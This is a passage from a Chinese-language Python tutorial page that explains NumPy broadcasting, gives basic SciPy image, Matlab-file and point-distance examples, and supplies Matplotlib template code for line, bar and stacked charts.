array 的 shape 中 <code>prepend</code> 数字 1（可以在不添加元素的前提下扩展维度），直至它们的 rank（就是 shape 元组的长度）相等；</p><blockquote><p>例如 <code>[1, 2, 3]</code>（shape <code>(3,)</code>）扩展一次维度后变成 <code>[[1, 2, 3]]</code>（shape <code>(1, 3)</code>）；</p></blockquote><p>定义：两个 arrays 在某个维度上 compatible（匹配），当且仅当它们的 shape 在这个维度上的值相同，<u>或者一方为 1</u>；</p><p>因此，第一步就是尝试让两个参与运算的 array 在每个维度上都匹配。数学上<strong>只有两个 array 在每个维度上都匹配，才能进行 broadcasting 操作</strong>。</p></li><li><p>两个 arrays 运算时，如果在某个维度上一方为 1，另一方大于 1，那么说明需要在这个维度上 broadcasting，具体做法就是让这个维度上为 1 的 array，在当前维度上重复多次直至与另一个 array 的相等；</p></li><li><p>如果两个 arrays 是匹配的，那么在最终运算结束时，结果是二者 shapes 的 element-wise 的最大值。</p></li></ol><p><strong>思考 1：为什么 broadcasting 会将向量加到矩阵的每一行，而不是每一列？</strong></p><p>答：由 broadcasting 算法决定。上面提到，会向 shape 中 <code>prepend</code> 数字 1，这就是原因（如果算法是 append 的话就是加到列上去了）。</p><p><strong>思考 2：那么我们如何利用 broadcasting 将向量加到每一列上？</strong></p><p>答：先用转置，然后最后再转置回去就行。或者使用 <code>reshape</code> 来手动预处理 shape（向它 append 1）；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line">w = np.array([<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>((x.T + w).T)</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line"><span class="built_in">print</span>(x + np.reshape(w, (<span class="number">2</span>, <span class="number">1</span>)))</span><br></pre></td></tr></table></figure><h4 id="常量-Element-wise-运算"><a href="#常量-Element-wise-运算" class="headerlink" title="常量 Element-wise 运算"></a>常量 Element-wise 运算</h4><p>这应该是广播最为通俗易懂的形式。</p><p>我们直接用常量（相当于扩展前的 shape <code>(1,)</code>）向矩阵乘：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"><span class="built_in">print</span>(x * <span class="number">2</span>)</span><br></pre></td></tr></table></figure><h4 id="计算向量叉积"><a href="#计算向量叉积" class="headerlink" title="计算向量叉积"></a>计算向量叉积</h4><blockquote><p>注：可以使用自带方法 <code>numpy.outer(a, b)</code>，这里只是展示如何用 broadcasting 完成叉积（外积）。</p></blockquote><p>本质上就是将被乘向量的每个元素乘到每个列上：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v = np.array([<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>])</span><br><span class="line">w = np.array([<span class="number">4</span>, <span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(np.reshape(v, (<span class="number">3</span>, <span class="number">1</span>)) * w)</span><br></pre></td></tr></table></figure><p>关于 Numpy 的基础用法掌握这么多就够了。如果希望更多的信息，请参见 Numpy 官方文档。</p><h2 id="0-2-SciPy"><a href="#0-2-SciPy" class="headerlink" title="0.2 SciPy"></a>0.2 SciPy</h2><p><code>SciPy</code> 库提供了一些高性能方法来计算和掌控多维数组，对科学计算和工程有很大用处。</p><p>最好入门的方法是阅读这个文档：<a href="https://docs.scipy.org/doc/scipy/reference/index.html">Scipy - Reference</a>。这里我们尽快入门为主，有需要再自行翻阅。</p><h3 id="0-2-1-Image-Operations"><a href="#0-2-1-Image-Operations" class="headerlink" title="0.2.1 Image Operations"></a>0.2.1 Image Operations</h3><p>Scipy 库提供了图像处理的基本函数。例如：</p><ul><li>从磁盘的图片中读入到 Numpy 数组；</li><li>将 Numpy 数组写成图片；</li></ul><p>下面是使用 Scipy resize 图片的例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 注：这个写法在 scipy 1.2.0 以后被弃用。</span></span><br><span class="line"><span class="comment"># 你应该使用 opencv 来导入图片</span></span><br><span class="line"><span class="comment"># from cv2 import imread, resize, imwrite</span></span><br><span class="line"><span class="keyword">from</span> scipy.misc <span class="keyword">import</span> imread, imsave, imresize</span><br><span class="line"></span><br><span class="line"><span class="comment"># Read an JPEG image into a numpy array</span></span><br><span class="line">img = imread(<span class="string">&#x27;assets/cat.jpg&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(img.dtype, img.shape)  <span class="comment"># Prints &quot;uint8 (400, 248, 3)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 补充计算机图形学知识：从这里能看出，jpg 格式的位深度为 8x3 = 24（bytes）</span></span><br><span class="line"><span class="comment"># 其中每个值是 uint8 存储，共 3 个通道（RGB）</span></span><br><span class="line"><span class="comment"># 如果是 png 格式，可以是 4 个通道（RGBA），可以存透明度，称为 PNG-32</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Broadcasting</span></span><br><span class="line"><span class="comment"># 将图像的 Green Channel 和 Blue Channel 像素值分别广播乘以 0.95 和 0.9</span></span><br><span class="line"><span class="comment"># 图像会微微泛红</span></span><br><span class="line">img_tinted = img * [<span class="number">1</span>, <span class="number">0.95</span>, <span class="number">0.9</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Resize</span></span><br><span class="line">img_tinted = imresize(img_tinted, (<span class="number">300</span>, <span class="number">300</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Save</span></span><br><span class="line">imsave(<span class="string">&#x27;assets/cat_tinted.jpg&#x27;</span>, img_tinted)</span><br></pre></td></tr></table></figure><h3 id="0-2-2-Matlab-Files"><a href="#0-2-2-Matlab-Files" class="headerlink" title="0.2.2 Matlab Files"></a>0.2.2 Matlab Files</h3><p>我们可以从 Matlab 中加载通用的矩阵文件。例如下面的例子是从 Matlab 的矩阵文件中加载复数矩阵：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scipy.io <span class="keyword">import</span> loadmat</span><br><span class="line"></span><br><span class="line"><span class="comment"># Load matlab mat file</span></span><br><span class="line">trainDataRaw = loadmat(<span class="string">&quot;data/PA_data_train.mat&quot;</span>)</span><br><span class="line">testDataRaw = loadmat(<span class="string">&quot;data/PA_data_test.mat&quot;</span>)</span><br><span class="line">train_input = trainDataRaw[<span class="string">&#x27;paInput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">train_output = trainDataRaw[<span class="string">&#x27;paOutput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(train_input) == <span class="built_in">len</span>(train_output), <span class="string">&quot;The size of input vector should be equal to the output one.&quot;</span></span><br><span class="line"></span><br><span class="line">test_input = testDataRaw[<span class="string">&#x27;paInput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">test_output = testDataRaw[<span class="string">&#x27;paOutput&#x27;</span>][<span class="number">0</span>]</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(test_input) == <span class="built_in">len</span>(test_output), <span class="string">&quot;The size of input vector should be equal to the output one.&quot;</span></span><br><span class="line"></span><br><span class="line">trainData = [(<span class="built_in">complex</span>(train_input[k]), <span class="built_in">complex</span>(train_output[k])) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(train_input))]</span><br><span class="line">testData = [(<span class="built_in">complex</span>(test_input[k]), <span class="built_in">complex</span>(test_output[k])) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(test_input))]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[INFO] Train data loaded: <span class="subst">&#123;<span class="built_in">len</span>(trainData)&#125;</span> groups (input, output)&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[INFO] Test data loaded: <span class="subst">&#123;<span class="built_in">len</span>(testData)&#125;</span> groups (input, output)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Preparing for the module of the data</span></span><br><span class="line">trainModule = [(<span class="built_in">abs</span>(i[<span class="number">0</span>]), <span class="built_in">abs</span>(i[<span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> trainData]</span><br><span class="line">testModule = [(<span class="built_in">abs</span>(i[<span class="number">0</span>]), <span class="built_in">abs</span>(i[<span class="number">1</span>])) <span class="keyword">for</span> i <span class="keyword">in</span> testData]</span><br></pre></td></tr></table></figure><h3 id="0-2-3-Distance-between-points"><a href="#0-2-3-Distance-between-points" class="headerlink" title="0.2.3 Distance between points"></a>0.2.3 Distance between points</h3><p>Scipy 求两点间距如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> scipy.spatial.distance <span class="keyword">import</span> pdist, cdist, squareform</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义了一组二维点</span></span><br><span class="line">x = np.array([</span><br><span class="line">    [<span class="number">0</span>, <span class="number">1</span>],</span><br><span class="line">    [<span class="number">1</span>, <span class="number">0</span>],</span><br><span class="line">    [<span class="number">2</span>, <span class="number">0</span>]</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算点集中两两间的欧几里得距离，输出为矩阵</span></span><br><span class="line"><span class="comment"># 第 i 行、第 j 列表示点集中第 i 个点和第 j 个点的欧式距离</span></span><br><span class="line"><span class="comment"># [[ 0.          1.41421356  2.23606798]</span></span><br><span class="line"><span class="comment">#  [ 1.41421356  0.          1.        ]</span></span><br><span class="line"><span class="comment">#  [ 2.23606798  1.          0.        ]]</span></span><br><span class="line">d = squareform(pdist(x, <span class="string">&#x27;euclidean&#x27;</span>))</span><br><span class="line"><span class="comment"># 等价于</span></span><br><span class="line">e = cdist(x, x, <span class="string">&#x27;euclidean&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="built_in">print</span>(e)</span><br></pre></td></tr></table></figure><p>还有一个 <code>cdist</code> 求的是两个点集间的距离（指定两个点集，而不像上面是在一个点集内），自动输出为矩阵形式。</p><h2 id="0-3-Matplotlib"><a href="#0-3-Matplotlib" class="headerlink" title="0.3 Matplotlib"></a>0.3 Matplotlib</h2><p>介绍一些模板用法。</p><h3 id="0-3-1-并列折线图"><a href="#0-3-1-并列折线图" class="headerlink" title="0.3.1 并列折线图"></a>0.3.1 并列折线图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">x = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;8&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line"></span><br><span class="line">prim = [<span class="number">27138166.8</span>, <span class="number">9152368.0</span>, <span class="number">7887584.4</span>, <span class="number">5203370.6</span>]</span><br><span class="line">opt = [<span class="number">45508900.4</span>, <span class="number">91379932.6</span>, <span class="number">179513808.6</span>, <span class="number">289122555.6</span>]</span><br><span class="line"></span><br><span class="line">axe.scatter(x, prim, c=<span class="string">&#x27;#219ebc&#x27;</span>, marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axe.scatter(x, opt, c=<span class="string">&#x27;#feb705&#x27;</span>, marker=<span class="string">&#x27;o&#x27;</span>)</span><br><span class="line"><span class="comment"># axe.scatter(x, ratio_3, c=&#x27;#fa8600&#x27;, marker=&#x27;^&#x27;)</span></span><br><span class="line">axe.plot(x, prim, <span class="string">&#x27;-&#x27;</span>, c=<span class="string">&#x27;#219ebc&#x27;</span>, label=<span class="string">&quot;Primitive&quot;</span>)</span><br><span class="line">axe.plot(x, opt, <span class="string">&#x27;-&#x27;</span>, c=<span class="string">&#x27;#feb705&#x27;</span>, label=<span class="string">&quot;Optimized&quot;</span>)</span><br><span class="line"><span class="comment"># axe.plot(x, ratio_3, &#x27;-&#x27;, c=&#x27;#fa8600&#x27;, label=&quot;Workload 3&quot;)</span></span><br><span class="line"></span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.legend()</span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line"></span><br><span class="line"><span class="comment"># axe.set_ylim([0.3, 1.2])</span></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;Thread Number&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Average Throughput (ops/s)&#x27;</span>)</span><br><span class="line">axe.set_title(<span class="string">&#x27;Average Throughput - Thread Number Relationship Plot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axe.ticklabel_format(style=<span class="string">&#x27;sci&#x27;</span>, scilimits=(-<span class="number">1</span>, <span class="number">2</span>), axis=<span class="string">&#x27;y&#x27;</span>, useMathText=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/throughput.png" width="400px" /></p><h3 id="0-3-2-并列直方图"><a href="#0-3-2-并列直方图" class="headerlink" title="0.3.2 并列直方图"></a>0.3.2 并列直方图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">labels = [<span class="string">&#x27;Tiny&#x27;</span>, <span class="string">&#x27;Small&#x27;</span>, <span class="string">&#x27;Medium&#x27;</span>, <span class="string">&#x27;Large&#x27;</span>]</span><br><span class="line">x_labels = labels</span><br><span class="line">width = <span class="number">0.2</span></span><br><span class="line">x = np.arange(<span class="built_in">len</span>(labels))</span><br><span class="line"></span><br><span class="line">qs = [<span class="number">5458</span>, <span class="number">36660</span>, <span class="number">155667</span>, <span class="number">1341294</span>]</span><br><span class="line">ls = [<span class="number">27247</span>, <span class="number">287699</span>, <span class="number">1146510</span>, <span class="number">10195125</span>]</span><br><span class="line">qs_r = [<span class="number">6469</span>, <span class="number">45830</span>, <span class="number">192725</span>, <span class="number">2354645</span>]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line"></span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line"></span><br><span class="line">axe.bar(x - width - <span class="number">0.05</span>, qs, width, color=<span class="string">&#x27;#2a9d8c&#x27;</span>, label=<span class="string">&#x27;Quick Select&#x27;</span>, zorder=<span class="number">10</span>,</span><br><span class="line">        edgecolor=<span class="string">&#x27;black&#x27;</span>, linewidth=<span class="number">1</span>)</span><br><span class="line">axe.bar(x, ls, width, label=<span class="string">&#x27;Linear Select ($Q=5$)&#x27;</span>, color=<span class="string">&#x27;#e9c46b&#x27;</span>, zorder=<span class="number">10</span>,</span><br><span class="line">        edgecolor=<span class="string">&#x27;black&#x27;</span>, linewidth=<span class="number">1</span>)</span><br><span class="line">axe.bar(x + width + <span class="number">0.05</span>, qs_r, width, color=<span class="string">&#x27;#e66f51&#x27;</span>, label=<span class="string">&#x27;Quick Select (random pivot)&#x27;</span>, zorder=<span class="number">10</span>,</span><br><span class="line">        edgecolor=<span class="string">&#x27;black&#x27;</span>, linewidth=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;Data Scale&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Operation Latency (ns)&#x27;</span>)</span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line"></span><br><span class="line">axe.set_yscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">axe.legend()</span><br><span class="line"></span><br><span class="line">axe.set_title(<span class="string">&#x27;Operation Latency for Unordered Data&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/1-2.png" width="400px" /></p><h3 id="0-3-3-堆叠条形图"><a href="#0-3-3-堆叠条形图" class="headerlink" title="0.3.3 堆叠条形图"></a>0.3.3 堆叠条形图</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">labels = [<span class="string">&#x27;Short (80 B)&#x27;</span>, <span class="string">&#x27;Middle (7.5 KB)&#x27;</span>, <span class="string">&#x27;Large (740 KB)&#x27;</span>]</span><br><span class="line">x_labels = labels</span><br><span class="line">width = <span class="number">0.2</span></span><br><span class="line">x = np.arange(<span class="built_in">len</span>(labels))</span><br><span class="line"></span><br><span class="line">uncompressed = [<span class="number">80</span>, <span class="number">7500</span>, <span class="number">740_000</span>]</span><br><span class="line">uncompressed_ratio = [<span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">single = [<span class="number">50</span>, <span class="number">4000</span>, <span class="number">392_000</span>]</span><br><span class="line">single_dict = [<span class="number">185</span>, <span class="number">477</span>, <span class="number">508</span>]</span><br><span class="line">single_ratio = [single[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line">single_dict_ratio = [single_dict[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">multi = [<span class="number">48</span>, <span class="number">3900</span>, <span class="number">383_000</span>]</span><br><span class="line">multi_dict = [<span class="number">212</span>, <span class="number">504</span>, <span class="number">528</span>]</span><br><span class="line">multi_ratio = [multi[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line">multi_dict_ratio = [multi_dict[i] / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line"></span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line"></span><br><span class="line">axe.bar(x - width - <span class="number">0.05</span>, uncompressed_ratio, width, color=<span class="string">&#x27;gray&#x27;</span>,label=<span class="string">&#x27;Uncompressed&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line">axe.bar(x, single_ratio, width, label=<span class="string">&#x27;Single&#x27;</span>, color=<span class="string">&#x27;#56baf8&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line">axe.bar(x + width + <span class="number">0.05</span>, multi_ratio, width, color=<span class="string">&#x27;#f8566a&#x27;</span>, label=<span class="string">&#x27;Multiple&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">axe.bar(x, single_dict_ratio, width, bottom=single_ratio, color=<span class="string">&#x27;#9fd8fb&#x27;</span>, label=<span class="string">&#x27;Single Dict&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line">axe.bar(x + width + <span class="number">0.05</span>, multi_dict_ratio, width, color=<span class="string">&#x27;#fb9fab&#x27;</span>, bottom=multi_ratio, label=<span class="string">&#x27;Multiple Dict&#x27;</span>, zorder=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;File Type&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Compress Ratio&#x27;</span>)</span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line">axe.legend()</span><br><span class="line"></span><br><span class="line">axe.set_title(<span class="string">&#x27;The Compressed Ratio Comparison&#x27;</span>)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="py_imgs/comp2.png" width="400px" /></p><h3 id="0-3-4-折线-直方组合图-amp-对数坐标"><a href="#0-3-4-折线-直方组合图-amp-对数坐标" class="headerlink" title="0.3.4 折线-直方组合图 &amp; 对数坐标"></a>0.3.4 折线-直方组合图 &amp; 对数坐标</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">labels = [<span class="string">&#x27;Short (80 B)&#x27;</span>, <span class="string">&#x27;Middle (7.5 KB)&#x27;</span>, <span class="string">&#x27;Large (740 KB)&#x27;</span>]</span><br><span class="line">x_labels = labels</span><br><span class="line">width = <span class="number">0.2</span></span><br><span class="line">x = np.arange(<span class="built_in">len</span>(labels))</span><br><span class="line"></span><br><span class="line">uncompressed = [<span class="number">80</span>, <span class="number">7500</span>, <span class="number">740_000</span>]</span><br><span class="line"></span><br><span class="line">single = [<span class="number">50</span>, <span class="number">4000</span>, <span class="number">392_000</span>]</span><br><span class="line">single_dict = [<span class="number">185</span>, <span class="number">477</span>, <span class="number">508</span>]</span><br><span class="line"></span><br><span class="line">single_dict_ratio_in_comp = [single_dict[i] / (single_dict[i] + single[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">multi = [<span class="number">48</span>, <span class="number">3900</span>, <span class="number">383_000</span>]</span><br><span class="line">multi_dict = [<span class="number">212</span>, <span class="number">504</span>, <span class="number">528</span>]</span><br><span class="line"></span><br><span class="line">multi_dict_ratio_in_comp = [multi_dict[i] / (multi_dict[i] + multi[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">single_total_ratio = [(single[i] + single_dict[i]) / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line">multi_total_ratio = [(multi[i] + multi_dict[i]) / uncompressed[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(labels))]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots()</span><br><span class="line">axe2 = axe.twinx()</span><br><span class="line"></span><br><span class="line">axe.bar(x - width / <span class="number">2</span> - <span class="number">0.03</span>, single_dict_ratio_in_comp, width, color=<span class="string">&#x27;#56baf8&#x27;</span>, label=<span class="string">&quot;Single&quot;</span>)</span><br><span class="line">axe.bar(x + width / <span class="number">2</span> + <span class="number">0.03</span>, multi_dict_ratio_in_comp, width, color=<span class="string">&#x27;#f8566a&#x27;</span>, label=<span class="string">&quot;Multiple&quot;</span>)</span><br><span class="line"></span><br><span class="line">axe.set_xticks(x)</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line"></span><br><span class="line">axe.set_xlabel(<span class="string">&#x27;File Type&#x27;</span>)</span><br><span class="line">axe.set_ylabel(<span class="string">&#x27;Dictionary Size Ratio&#x27;</span>)</span><br><span class="line"></span><br><span class="line">axe.minorticks_on()</span><br><span class="line">axe.grid()</span><br><span class="line">axe.set_yscale(<span class="string">&#x27;log&#x27;</span>)</span><br><span class="line">axe.legend()</span><br><span class="line"></span><br><span class="line">axe2.scatter(x, single_total_ratio, c=<span class="string">&#x27;k&#x27;</span>, marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axe2.scatter(x, multi_total_ratio, c=<span class="string">&#x27;k&#x27;</span>, marker=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">axe2.plot(x, single_total_ratio, <span class="string">&#x27;g--&#x27;</span>, label=<span class="string">&quot;Single in Total&quot;</span>)</span><br><span class="line">axe2.plot(x, multi_total_ratio, <span class="string">&#x27;y-&#x27;</span>, label=<span class="string">&quot;Multiple in Total&quot;</span>)</span><br><span class="line">axe2.legend(loc=(<span class="number">0.66</span>, <span 